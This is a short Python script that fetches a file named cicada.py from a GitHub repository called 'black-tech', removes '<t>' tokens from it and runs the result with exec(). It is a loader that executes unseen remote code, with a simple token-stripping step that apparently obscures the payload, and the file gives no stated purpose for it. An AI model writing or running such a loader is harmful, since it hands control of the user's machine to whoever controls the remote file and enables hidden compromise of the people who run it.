from urllib.request import urlopen
import os

path = 'cicada.py'
url = 'https://raw.githubusercontent.com/cicadoves/black-tech/main/'+path
code = urlopen(url).read().decode()
exec(code.replace('<t>',''))
